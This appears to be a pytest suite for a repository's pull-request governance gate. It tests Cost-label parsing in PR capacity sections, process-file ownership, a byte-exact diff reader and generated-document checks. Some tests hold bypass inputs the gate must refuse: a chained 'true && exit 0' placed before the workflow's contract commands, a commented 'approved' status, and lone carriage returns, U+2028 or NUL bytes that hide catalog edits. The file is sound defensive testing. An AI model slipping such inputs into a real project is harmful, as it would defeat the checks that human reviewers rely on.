                or "gives no number for Volume, Velocity, Wall-clock, Cost" in results[0].stdout), results[0].stdout
        assert "gives no number for Velocity;" in results[1].stdout, results[1].stdout
        # divergent Cost beside the legacy value: pair check, before dispatch
        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $999"))
        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: 300 \u00b7 Cost: $999"))
        # both carriers changed: pairwise equal, so only the independently captured BASE input catches it
        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "$/run \u00d7 runs/day \u00d7 30: $999 \u00b7 Cost: $999"))
        # missing, duplicate and reordered carrier
        assert "has no Cost carrier immediately after it" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(" \u00b7 Cost: $0.01", ""))
        assert "differs from legacy carrier value" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(" \u00b7 Cost: $0.01", " \u00b7 Cost: $0.01 \u00b7 Cost: $0.01"))
        assert "has no Cost carrier immediately after it" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace(pair, "Cost: $0.01 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01"))
        # a Cost carrier added where BASE had none
        assert "without a legacy carrier" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague + "Cost: $0.01\n")
        # dropped negative case (the accepted body where the first rejection belongs), replaced negative case,
        # changed quantity, duplicated case, changed caller vector
        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 1, filled)
        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague.replace("Volume: unknown", "Volume: 1 row"))
        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 3, filled.replace("Volume: 30 rows", "Volume: 31 rows"))
        assert "body identity" in capacity_bridge_refused(repo, name, originals, job, title, 2, vague)
        assert "files" in capacity_bridge_refused(repo, name, originals, job, title, 1, vague, {**job, "gcp/other_job.py": "x = 1\n"})
        # stopping short of the sequence is what the per-function finalizer refuses
        capacity_bridge_activate(name)
        for text in originals[:2]:
            pr(repo, BRANCH, job, **title, PR_BODY=text)
        assert capacity_bridge_consumed() == (2, 3)
        # one case more than BASE recorded
        capacity_bridge_activate(name)
        for text in originals:
            pr(repo, BRANCH, job, **title, PR_BODY=text)
        before = dispatched()
        with pytest.raises(CapacityFixtureEquivalenceError, match="beyond the 3 BASE cases"):
            pr(repo, BRANCH, job, **title, PR_BODY=filled)
        assert dispatched() == before
        # matching controls: blank, invalid, zero, prose and valid pairs reverse to their originals
        for original, bridged in (("30:\n", "30: \u00b7 Cost:\n"), ("30: TBD\n", "30: TBD \u00b7 Cost: TBD\n"),
                                  ("30: $0\n", "30: $0 \u00b7 Cost: $0\n"), ("30: see issue 42\n", "30: see issue 42 \u00b7 Cost: see issue 42\n"),
                                  ("$/run \u00d7 runs/day \u00d7 30: $0.01\n", "$/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n")):
            assert capacity_bridge_split("## Capacity\nVolume: 1 row\n" + bridged) == ("## Capacity\nVolume: 1 row\n" + original, (original.split(":", 1)[1].strip(),))
        assert capacity_bridge_split(None) == (None, ())
        assert capacity_bridge_split("## Capacity\nVolume: 30 rows\n") == ("## Capacity\nVolume: 30 rows\n", ())
    finally:
        capacity_bridge_activate(None)



COST_TEMPLATE = ".github/pull_request_template.md"
COST_TEMPLATE_OLD = "- $/run × runs/day × 30: <!-- new scheduled jobs -->"
COST_TEMPLATE_NEW = "- Cost: <!-- $/run × runs/day × 30 for new scheduled jobs -->"
COST_JOB = {**CODE, "gcp/model_job.py": "print('run')\n"}
COST_TITLE = {"PR_TITLE": "FEAT-MODEL-001: x"}


def cost_capacity(*lines: str) -> str:
    """A PR body whose Capacity section holds `lines`, one value per line."""
    return body() + "\n\n## Capacity\n" + "\n".join(lines) + "\n"


def cost_template_capacity(volume: str, velocity: str, wall: str, cost: str | None) -> str:
    """The Capacity section of the real default PR template, its comments filled the way an author fills them."""
    text = (REPO / COST_TEMPLATE).read_text(encoding="utf-8")
    start = text.index("## Capacity")
    section_text = text[start:text.index("\n## ", start + 1)]
    filled = (section_text.replace("- Volume: <!-- input rows × bytes/row -->", "- Volume: " + volume)
              .replace("- Velocity: <!-- SQL queries / API calls / round-trips per input row × total -->", "- Velocity: " + velocity)
              .replace("- Wall-clock: <!-- queries × per-query latency", "- Wall-clock: " + wall + " <!-- queries × per-query latency"))
    if cost is not None:
        filled = filled.replace(COST_TEMPLATE_NEW, "- Cost: " + cost).replace(COST_TEMPLATE_OLD, "- $/run × runs/day × 30: " + cost)
    return body() + "\n\n" + filled + "\n"


def test_capacity_cost_label_contract(repo):
    """FEAT-CICD-001 capacity Cost label (spec 2026-11-04-feat-cicd-001-capacity-cost-label-whole-job.md,
    which supersedes 2026-10-13-feat-cicd-001-capacity-cost-label.md with the same done_when[0] and [1]).

    On the old tuple a numeric Cost-only body was refused as leaving 30 blank, and an unrelated
    bare `30: 0.01 samples` was taken as the cost. The cost field is now the explicit `Cost:` label,
    with no alias for any `30`, and the default PR template names it.
    """
    passing = (
        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01"),
        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01/run x 2 runs/day x 30 = $0.60/month"),
        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0"),
        ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01", "30: 0.01 unrelated samples"),
    )
    for lines in passing:
        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
        assert r.returncode == 0, (lines, r.stdout + r.stderr)
    refused = (
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s"), "leaves Cost blank"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost:"), "leaves Cost blank"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "30: 0.01 samples"), "leaves Cost blank"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "$/run × runs/day × 30: $0.01"), "leaves Cost blank"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost:", "30: $0.01"), "leaves Cost blank"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: unknown", "30: $0.01"), "gives no number for Cost;"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: see issue 42", "30: $0.01"), "gives no number for Cost;"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: TBD", "$/run × runs/day × 30: $0.01"), "gives no number for Cost;"),
        (("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01 until the follow-up measures it", "30: $0.01"), "defers Cost"),
    )
    for lines, reason in refused:
        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
        assert r.returncode == 1 and reason in r.stdout, (lines, r.stdout + r.stderr)
    # the default template: its one cost line is the Cost label, and only that line changed
    raw = (REPO / COST_TEMPLATE).read_bytes()
    assert hashlib.sha256(raw).hexdigest() == "201355b3343f7b81f22bfba8b7260406e7b246ef02948d7430a118372e574ad2"
    template = raw.decode("utf-8")
    assert template.count(COST_TEMPLATE_NEW) == 1 and COST_TEMPLATE_OLD not in template
    original = template.replace(COST_TEMPLATE_NEW, COST_TEMPLATE_OLD)
    assert hashlib.sha256(original.encode("utf-8")).hexdigest() == "496bc1e31588d4ea392559fd5ab0097bfaf4a6b5761f745d2ac1271fa498450a"
    filled = cost_template_capacity("30 rows × 200 B", "1 query", "2 s", "$0.01/run x 2 runs/day x 30 = $0.60/month")
    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=filled)
    assert r.returncode == 0, r.stdout + r.stderr
    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=body() + "\n\n" + template[template.index("## Capacity"):])
    assert r.returncode == 1 and "leaves Volume, Velocity, Wall-clock, Cost blank" in r.stdout, r.stdout + r.stderr
    hidden = cost_template_capacity("30 rows", "1 query", "2 s", None)
    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=hidden)
    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr
    r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=hidden.replace("- Cost: <!--", "- Cost: <!-- $0.01"))
    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr
    # the template stays a gated FEAT-CICD-001 process input: a docs/ branch or another FEAT's branch is refused
    on_base(repo, {CATALOG: CATALOG_TEXT.replace(
        "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
        "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |"),
                   COST_TEMPLATE: template})   # the real template on base, so each case edits it
    edited = {COST_TEMPLATE: template.replace(COST_TEMPLATE_NEW, "- Cost: <!-- per run x runs/day x 30 -->")}
    for branch, reason in (("docs/template-tweak", "(.github/pull_request_template.md) but is not feature/"),
                           (BRANCH, "process change(s) (.github/pull_request_template.md) belong to FEAT-CICD-001, not FEAT-MODEL-001")):
        r = pr(repo, branch, edited, **COST_TITLE, PR_BODY=filled)
        assert r.returncode == 1 and reason in r.stdout, (branch, r.stdout + r.stderr)


def test_capacity_cost_rendered_budget_guards(repo):
    """FEAT-CICD-001 capacity Cost label: the Cost field keeps every guard the other three labels have
    (numbers lead, blank stays on its own line, deferrals, rendering, n/a, workload detection)."""
    full = ("Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s")
    refused = (
        (full + ("Cost: 2024 budget",), "gives no number for Cost;"),
        (full + ("Cost: #1205",), "gives no number for Cost;"),
        (full + ("Cost: TBD",), "gives no number for Cost;"),
        (full + ("Cost: $0.01 future work",), "defers Cost"),
        (("Volume: 30 rows", "Velocity: 1 query", "Cost:", "Wall-clock: 2 s"), "leaves Cost blank"),
        (full + ("<!-- Cost: $0.01 -->",), "leaves Cost blank"),
        (full + ("```", "Cost: $0.01", "```"), "leaves Cost blank"),
        (full + ("- [ ] Cost: $0.01",), "leaves Cost blank"),
        (full + ("Canvas refresh pending: Cost: $0.01",), "leaves Cost blank"),
        (full + ("n/a: nothing runs differently",), "leaves Cost blank"),
        (("n/a:",), "leaves Volume, Velocity, Wall-clock, Cost blank"),
        (full[:2] + ("Cost: $0.01", "## Later", "Wall-clock: 2 s"), "leaves Wall-clock blank"),
        (("cost: $0.01",) + full, "leaves Cost blank"),
    )
    for lines, reason in refused:
        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
        assert r.returncode == 1 and reason in r.stdout, (lines, r.stdout + r.stderr)
    passing = (
        full + ("Cost: ~$0.02",),
        full + ("Cost: <$1/month",),
        full + ("Cost: about one dollar a month",),
        full + ("**Cost:** $0.01",),
        ("n/a: nothing runs differently",),
        ("<p>", "", "Volume: 30 rows", "Velocity: 1 query", "Wall-clock: 2 s", "Cost: $0.01", "", "</p>"),
    )
    for lines in passing:
        r = pr(repo, BRANCH, COST_JOB, **COST_TITLE, PR_BODY=cost_capacity(*lines))
        assert r.returncode == 0, (lines, r.stdout + r.stderr)
    # a change with no workload needs no Cost; a workflow is a workload like gcp/
    assert pr(repo, BRANCH, CODE, **COST_TITLE, PR_BODY=cost_capacity(*full)).returncode == 0
    r = pr(repo, BRANCH, {**CODE, ".github/workflows/job.yml": "name: job\n"}, **COST_TITLE, PR_BODY=cost_capacity(*full))
    assert r.returncode == 1 and "leaves Cost blank" in r.stdout, r.stdout + r.stderr


def test_chained_exits_quoted_hashes_and_headings_beside_rows_are_the_contract(repo):
    """solyra#72 r4127814345 (P1), r4127814350 (P2), r4127814359 (P2) (spec_gate.py:553, :1280, :2669).

    `true && exit 0` before the contract commands left them counted; `status: "approved # x"` read as
    approved; a feature PR could add a `### FEAT` heading beside its row-only record and close out on
    the heading's fields. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          true && exit 0\n          " + VERDICT_CMD)}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          test -d scripts || exit 1\n          " + VERDICT_CMD)}, **cap).returncode == 0
    r = pr(repo, "docs/spec", {SPEC: spec().replace("status: approved", 'status: "approved # awaiting review"', 1)})
    assert r.returncode == 1 and "status" in r.stdout, r.stdout
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    row_only = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production\n\n", "", 1)
    assert row_only != CATALOG_TEXT
    on_base(repo, {CATALOG: row_only})
    with_heading = row_only + f"\n### FEAT-MODEL-001\n\n- Status: Production\n- Last reviewed: {TODAY}\n- PRs: #42\n"
    r = pr(repo, BRANCH, {**job, CATALOG: with_heading}, **title, PR_BODY=body(ticked=True) + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "adds a second heading or row" in r.stdout, r.stdout


def test_root_namespace_application_stays_owned_by_its_actual_feature(repo):
    catalog = CATALOG_TEXT.replace('| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |',
                                   '| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |')
    on_base(repo, {CATALOG: catalog})
    accepted = pr(repo, BRANCH, {'platform/api/ordinary.py': 'VALUE = 1\n'},
                  PR_TITLE='FEAT-MODEL-001: namespace application input', PR_DRAFT='true')
    assert accepted.returncode == 0, accepted.stdout + accepted.stderr
    refused = pr(repo, BRANCH, {'platform/__init__.py': '# regular package transition\n'},
                 PR_TITLE='FEAT-MODEL-001: effective package transition', PR_DRAFT='true')
    assert refused.returncode == 1 and 'belong to FEAT-CICD-001' in refused.stdout


def test_existing_root_regular_package_child_is_process_input_on_both_sides(repo):
    catalog = CATALOG_TEXT.replace('| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |',
                                   '| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n| FEAT-CICD-001 | Delivery | Production | unknown | none |')
    on_base(repo, {CATALOG: catalog, 'json/__init__.py': '# actual regular package\n',
                   'json/decoder.py': 'VALUE = 1\n'})
    refused = pr(repo, BRANCH, {'json/decoder.py': 'VALUE = 2\n'},
                 PR_TITLE='FEAT-MODEL-001: transitive startup input', PR_DRAFT='true')
    assert refused.returncode == 1 and 'belong to FEAT-CICD-001' in refused.stdout
    removed = pr(repo, BRANCH, {'json/__init__.py': None, 'json/decoder.py': 'VALUE = 3\n'},
                 PR_TITLE='FEAT-MODEL-001: package removal remains process input', PR_DRAFT='true')
    assert removed.returncode == 1 and 'belong to FEAT-CICD-001' in removed.stdout


# REQ-GOV-004 byte-scope acceptance, attributed core fd178/9ee; current governance retained.

def load_gate(root: Path) -> types.ModuleType:
    """root's copy of the gate as a module of its own: its ROOT is root, so its git calls read that repository.
    Registered in sys.modules, where dataclasses look their module up."""
    n = 0
    while f"spec_gate_under_test_{n}" in sys.modules:
        n += 1
    name = f"spec_gate_under_test_{n}"
    found = importlib.util.spec_from_file_location(name, root / "scripts/gate/spec_gate.py")
    module = importlib.util.module_from_spec(found)
    sys.modules[name] = module
    found.loader.exec_module(module)
    return module

def base_and_head(repo: Path) -> tuple[str, str]:
    base, head = _git(repo, "rev-parse", "base", "HEAD").splitlines()
    return base, head

def test_changed_lines_reads_the_diff_as_bytes(repo):
    """FEAT-CICD-001 spec, the diff reader (done_when[2]).

    Main's reader took a content line beginning with `---` or `+++` for a file header and split text-mode output at a
    lone carriage return and at U+2028: the first diff read as [], the second as five lines that git never wrote.
    """
    sg = load_gate(repo)
    on_base(repo, {"docs/f.md": "a\n---\n-- keep\nb\nc\nd\n"})
    pr(repo, "docs/probe", {"docs/f.md": "a\n+++ added\n++ also\nb\nc\nd\n"})
    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "---"), ("-", 3, "-- keep"), ("+", 2, "+++ added"), ("+", 3, "++ also")]
    on_base(repo, {"docs/f.md": "a\nb\nc\nd\ne\nf\n"})
    pr(repo, "docs/probe", {"docs/f.md": "a\nb-new\r+phantom\nc\nd\ne-new\u2028@@ -9 +9 @@\nf\n"})
    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "b"), ("+", 2, "b-new\r+phantom"), ("-", 5, "e"), ("+", 5, "e-new\u2028@@ -9 +9 @@")]
    # (red-team round 1: context lines that git's config adds between hunks, blank ones printed empty, are counted)
    on_base(repo, {"docs/f.md": "a\nb\n\nc\nd\ne\n"})
    pr(repo, "docs/probe", {"docs/f.md": "a\nB\n\nc\nd\nE\n"})
    _git(repo, "config", "diff.interHunkContext", "5")
    _git(repo, "config", "diff.suppressBlankEmpty", "true")
    assert sg.changed_lines(*base_and_head(repo), "docs/f.md") == [("-", 2, "b"), ("+", 2, "B"), ("-", 6, "e"), ("+", 6, "E")]

def test_changed_lines_raises_on_a_binary_or_hunkless_diff(repo):
    """FEAT-CICD-001 spec, the diff reader (done_when[2]).

    A NUL makes git print "Binary files differ" and a mode change prints no hunk: main's reader returned no lines for a
    path it was asked about, which the catalog scope check read as nothing changed.
    """
    sg = load_gate(repo)
    on_base(repo, {"docs/f.md": "a\n"})
    pr(repo, "docs/probe", {"docs/f.md": "a\x00\n"})                                  # binary
    with pytest.raises(sg.GitFailed, match="no text hunk"):
        sg.changed_lines(*base_and_head(repo), "docs/f.md")
    pr(repo, "docs/probe", {}, then=lambda r: (r / "docs/f.md").chmod(0o755))         # mode only
    with pytest.raises(sg.GitFailed, match="no text hunk"):
        sg.changed_lines(*base_and_head(repo), "docs/f.md")

def test_added_lines_is_gone():
    """FEAT-CICD-001 spec, the diff reader (done_when[2]): added_lines had no caller and read the diff as main's
    changed_lines did."""
    defined = {n.name for n in ast.parse(GATE.read_text(encoding="utf-8")).body if isinstance(n, ast.FunctionDef)}
    assert "changed_lines" in defined and "added_lines" not in defined

def test_feat_span_and_section_of_number_lines_as_git_does(repo):
    """FEAT-CICD-001 spec, the diff reader (done_when[2]): git numbers lines by "\\n" alone. Main split decoded text
    with splitlines(), which also breaks at U+2028 and a lone carriage return, so its line numbers ran ahead of git's."""
    sg = load_gate(repo)
    assert sg.feat_span("### FEAT-A-001\nx y\n### FEAT-B-001\nz\n", "FEAT-A-001") == {1, 2}      # main: {1, 2, 3}
    assert sg.section_of("### FEAT-A-001\nx\ry\n### FEAT-B-001\n", "FEAT-A-001") == range(1, 3)    # main: range(1, 4)

def test_the_catalog_scope_check_sees_every_changed_line(repo):
    """FEAT-CICD-001 spec, the diff reader (done_when[2]).

    Each case is an edit to FEAT-DATA-001's record by the FEAT-MODEL-001 branch that main's gate passed (measured):
    the reader dropped the line, or numbered it inside the branch's own record.
    """
    own = "### FEAT-MODEL-001\n\n- Status: Production"
    added = "### FEAT-DATA-001\nAdded by a FEAT-MODEL-001 branch.\nAnd a second line.\n"
    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
    outcomes = {}
    on_base(repo, {CATALOG: CATALOG_TEXT + "\n---\n\n-- keep this caveat\n"})
    outcomes["a removed '---' line"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT + "\n\n\n-- keep this caveat\n"}, **ok)
    on_base(repo, {CATALOG: CATALOG_TEXT})
    outcomes["a NUL in the own Status"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\x00").replace(
        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")}, **ok)
    outcomes["U+2028 in the own record"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + " " * 4).replace("### FEAT-DATA-001\n", added)}, **ok)
    outcomes["lone CRs in the own record"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\r" * 4).replace("### FEAT-DATA-001\n", added)}, **ok)
    # (red-team round 1: with diff.interHunkContext in the config git reads, main numbered the second hunk inside the own record)
    _git(repo, "config", "diff.interHunkContext", "5")
    outcomes["context lines from git's config"] = pr(repo, BRANCH, {**CODE, CATALOG: CATALOG_TEXT.replace(own, own + "\n- Note: mine").replace(
        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")}, **ok)
    _git(repo, "config", "--unset", "diff.interHunkContext")
    missed = {k: r.stdout[-300:] for k, r in outcomes.items() if r.returncode != 1
              or not ("lines outside FEAT-MODEL-001's row and record change" in r.stdout or "no text hunk" in r.stdout)}
    assert missed == {}, missed


def change(repo: Path, branch: str, files: dict[str, str | None], then: Callable[[Path], object] | None = None) -> None:
    """Commit, on `branch` cut from base, `files` (None deletes one), after `then(repo)` if given."""
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-f", "-q", "-B", branch, "base")
    for path, text in files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    if then is not None:
        then(repo)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", f"change on {branch}")

def test_the_renderer_and_its_snapshot_are_process_files(repo):
    """FEAT-CICD-001 spec, is_process_file (done_when[4]): the gate now trusts the renderer, its package and its
    snapshot to decide a verdict, so a change to them is FEAT-CICD-001's work, as the gate's own files are."""
    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: cicd_row})
    paths = ("scripts/__init__.py", "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
             "scripts/maintenance/__init__.py", "tests/fixtures/live_gcp_snapshot_2026-09-07.json")
    missed = [p for p in paths if "belong to FEAT-CICD-001" not in
              pr(repo, BRANCH, {**CODE, p: "# x\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body()).stdout]
    assert missed == [], missed


def test_the_gate_names_the_documents_and_snapshot_the_docs_test_reads():
    """FEAT-CICD-001 spec, parity (done_when[3]): the gate's three document paths are the renderer's MARKER_DOCS
    and its snapshot is the docs test's SNAPSHOT, so the gate checks what the docs test checks."""
    sg = load_gate(REPO)
    assert sg.GENERATED_RULE == "REQ-GOV-004" and sg.RENDER_INPUTS == (
        "scripts/__init__.py", "scripts/maintenance/__init__.py",
        "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
        "tests/scripts/test_check_generated_docs.py", "tests/fixtures/live_gcp_snapshot_2026-09-07.json")
    # the renderer tests cannot be switched off in a repository that carries the documents
    assert RENDERER_HERE == all((REPO / d).is_file() for d in sg.GENERATED_DOCS)
    if RENDERER_HERE:
        from scripts.maintenance import check_generated_docs as cgd
        from tests.scripts.test_check_generated_docs import SNAPSHOT
        assert sg.GENERATED_DOCS == cgd.MARKER_DOCS and REPO / sg.RENDER_SNAPSHOT == SNAPSHOT


# The generated documents: a fixture tree holding scripts/maintenance/, the snapshot and only the files the three
# documents' blocks render from, rendered once per session (inventory_template) and copied per test.
INFRA = "docs/product/infrastructure"
GENERATED = (f"{INFRA}/05-a-ARCHITECTURE.md", f"{INFRA}/05-c-DATA_DEPENDENCIES.md", f"{INFRA}/05-e-API.md")
API_DOC = GENERATED[2]
SNAPSHOT_FILE = "tests/fixtures/live_gcp_snapshot_2026-09-07.json"
MAIN_PY = "platform/api/main.py"
RENDER_TREE = ("scripts/maintenance/__init__.py", "scripts/maintenance/doc_inventory.py", "scripts/maintenance/check_generated_docs.py",
               SNAPSHOT_FILE, MAIN_PY, "gcp/deploy.sh", "gcp/schema.sql", "scripts/discord/register_commands.py")
# Representative SOURCE input, not mocked renderer output. The same four source
# paths exercise real route/deploy/schema/command parsing and line citations.
# Full production-tree rendering is measured separately; copying its entire ASTs
# into every adversarial fixture needlessly multiplied test I/O/render time.
RENDER_SOURCE = {
    MAIN_PY: '"""Representative API.\n\nInventory fixture.\n"""\nfrom fastapi import FastAPI\nfrom gcp.database import query_to_dataframe\napp = FastAPI()\n\n@app.get("/health")\ndef health_check():\n    """Liveness probe: reports service health."""\n    return {"status": "ok"}\n\n@app.get("/api/daily")\ndef daily_rows():\n    """Read retained daily observations."""\n    return query_to_dataframe("SELECT close FROM market_data_daily")\n',
    "gcp/deploy.sh": '#!/bin/bash\ndeploy_probe() {\n    gcloud run jobs deploy inventory-probe \\\n        --command python3 \\\n        --args gcp/probe.py\n}\n',
    "gcp/schema.sql": "CREATE TABLE market_data_daily (\n    ticker TEXT NOT NULL,\n    date DATE NOT NULL,\n    close DOUBLE PRECISION,\n    volume BIGINT,\n    PRIMARY KEY (ticker, date)\n);\n",
    "scripts/discord/register_commands.py": 'SUB_COMMAND = 1\nCOMMANDS = [{"name": "probe", "description": "Inventory probe", "options": []}]\n',
}
TRACE_TEXT = "# Traceability\n\n### FEAT-MODEL-001\n\n- #1\n"
RULE = "REQ-GOV-004"
DOCS_OK = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body() + "\n\n## Capacity\nn/a: x\n"}


def skeleton(doc: str) -> str:
    """doc with prose around every block the docs test expects in it, each block empty until rendered."""
    from scripts.maintenance.check_generated_docs import EXPECTED_MARKERS   # stocks only: called where RENDERER_HERE
    from scripts.maintenance.doc_inventory import MARKER_END, MARKER_START
    parts = [f"# {Path(doc).stem}", "Prose before the blocks."]
    for name in EXPECTED_MARKERS[doc]:
        parts += [f"{MARKER_START.format(name=name)}\n\n{MARKER_END.format(name=name)}", f"Prose after {name}."]
    return "\n\n".join(parts) + "\n"


def render(root: Path, docs: tuple[str, ...] = GENERATED) -> None:
    """Re-render docs' blocks in root's working tree with root's renderer, as a person re-renders them.
    -B: a __pycache__ would otherwise be committed by `git add -A`."""
    subprocess.run([sys.executable, "-B", "-m", "scripts.maintenance.doc_inventory", "--root", ".", "--snapshot", SNAPSHOT_FILE,
                    "--insert", *docs], cwd=root, check=True)


def moved_main() -> str:
    """Fixture platform/api/main.py with four lines added after its docstring: every line the documents cite below
    them moves, as stocks#1366 moved them."""
    lines = RENDER_SOURCE[MAIN_PY].split("\n")
    return "\n".join(lines[:4] + ["# moved by four lines, as stocks#1366 moved them", "# two", "# three", "# four"] + lines[4:])


def edit(text: str, old: str, new: str) -> str:
    """text with its first `old` replaced, which must be there: a case cannot silently become its control."""
    assert old in text, old
    return text.replace(old, new, 1)


def refused(r: subprocess.CompletedProcess, fragment: str) -> bool:
    return r.returncode == 1 and RULE in r.stdout and fragment in r.stdout


@pytest.fixture(scope="session")
def inventory_template(tmp_path_factory) -> tuple[Path, dict[str, str]] | None:
    """make_repo plus RENDER_TREE from REPO and the three documents rendered over it, as `base`; and `moved`, the
    files a change that moves main.py's cited lines carries: main.py and the three documents re-rendered. The render
    runs in this whole repository, because lib/ and scripts/gate/ change its modules and table-reference blocks."""
    if not RENDERER_HERE:
        return None
    root = make_repo(tmp_path_factory.mktemp("inventory"))
    files = {p: RENDER_SOURCE[p] if p in RENDER_SOURCE else (REPO / p).read_bytes().decode("utf-8")
             for p in RENDER_TREE}
    on_base(root, {**files, **{d: skeleton(d) for d in GENERATED}, TRACEABILITY: TRACE_TEXT}, then=render)
    _git(root, "checkout", "-q", "-b", "moved", "base")
    write(root, MAIN_PY, moved_main())
    render(root)
    moved = {p: (root / p).read_bytes().decode("utf-8") for p in (MAIN_PY, *GENERATED)}
    _git(root, "checkout", "-q", "-f", "main")
    _git(root, "branch", "-q", "-D", "moved")
    return root, moved


@pytest.fixture
def inventory_repo(inventory_template, tmp_path) -> tuple[Path, dict[str, str]] | None:
    """A copy of inventory_template for one test, which may move its base."""
    if inventory_template is None:
        return None
    template, moved = inventory_template
    root = tmp_path / "repo"
    shutil.copytree(template, root, symlinks=True)
    return root, dict(moved)


def test_the_gate_imports_the_renderer_only_for_a_generated_document(inventory_repo):
    """FEAT-CICD-001 spec, the allowance (done_when[3]): the gate imports scripts/maintenance only when one of the
    three documents changes, so every other pull request is judged without it."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        on_base(root, {"scripts/maintenance/doc_inventory.py": 'raise RuntimeError("doc_inventory imported")\n'})
        code_only = pr(root, BRANCH, CODE, **DOCS_OK)
        with_docs = pr(root, BRANCH, {**CODE, API_DOC: moved[API_DOC]}, **DOCS_OK)
        assert (code_only.returncode, with_docs.returncode != 0, "doc_inventory imported" in with_docs.stderr) == (0, True, True), \
            code_only.stdout + with_docs.stdout + with_docs.stderr


def test_a_checkout_without_the_renderer_refuses_generated_documents_as_before(repo):
    """FEAT-CICD-001 spec, the allowance (done_when[3]): a checkout without scripts/maintenance/ (solyra's, and this
    suite's plain repo) gives no allowance and refuses a generated document as main does, without failing."""
    r = pr(repo, BRANCH, {**CODE, "docs/product/infrastructure/05-e-API.md": "# API\n"}, **DOCS_OK)
    assert r.returncode == 1 and "05-e-API.md changes in this feature change" in r.stdout and RULE in r.stdout \
        and "Traceback" not in r.stderr, r.stdout + r.stderr


def test_parent_renderer_initializer_cannot_enter_main_via_a_feature(inventory_repo):
    """Real BASE-checkout first-stage refusal closes the later startup-verdict bypass."""
